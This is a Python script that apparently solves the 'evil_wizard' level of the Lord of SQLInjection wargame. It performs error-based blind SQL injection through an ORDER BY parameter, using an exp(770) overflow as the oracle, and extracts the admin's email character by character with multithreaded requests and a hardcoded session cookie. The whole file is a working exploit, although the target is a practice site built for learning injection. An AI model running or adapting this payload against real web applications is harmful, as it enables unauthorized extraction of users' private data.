import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
charset = sorted(string.printable)
true_cond = "<tr><th>id</th><th>email</th><th>score</th><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr><tr><td>admin</td><td>**************</td><td>50</td></tr>"
max_len = 50
max_workers = 10

# create session with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "orplvan5dq4jd7dkailkvshr3n")

def check_condition(payload):
    params = {"order": payload}
    try:
        r = session.get(url, params=params, timeout=5)
        # print(f"[+] url: {r.url}")
        return true_cond not in r.text
    except requests.RequestException:
        return False

def get_length():
    for n in range(1, max_len + 1):
        # payload = f"IF(LENGTH(email)={n},id,score)"
        payload = f"(select exp(770) where length((select email where id='admin'))={n})"
        if check_condition(payload):
            print(f"[i] Length of email: {n}")
            return n
    print(f"[i] Could not determine length (max_len reached)")
    return max_len

def check_char(pos, ch):
    # payload = f"IF(ascii(substr(email,{pos},1))={ord(ch)},id,score)"
    payload = f"(select exp(770) where ascii(substr((select email where id='admin'),{pos},1))={ord(ch)})"

    return ch if check_condition(payload) else None

def mask_secret(secret, total_len):
    """Pad secret with * until reaching total_len"""
    return secret + "*" * (total_len - len(secret))

def extract(initial_flag=""):
    length = get_length()
    result = list(initial_flag)

    start_pos = len(initial_flag) + 1
    if initial_flag:
        print(f"[i] Starting with initial flag: {initial_flag}")
        print(f"[i] Masked: {mask_secret(initial_flag, length)}")

    for pos in range(start_pos, length + 1):
        found_char = None

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_char = {executor.submit(check_char, pos, ch): ch for ch in charset}
            for future in as_completed(future_to_char):
                ch = future.result()
                if ch:
                    found_char = ch
                    for f in future_to_char:
                        f.cancel()
                    break

        if not found_char:
            print(f"[-] No character found at position {pos}, stopping.")
            break

        result.append(found_char)
        print(f"[+] Position {pos}: {mask_secret(''.join(result), length)}")

    extracted = "".join(result)
    print(f"\n[+] Extraction complete:\n{extracted}")
    return extracted

if __name__ == "__main__":
    # You can set your known prefix here
    extract(initial_flag="")
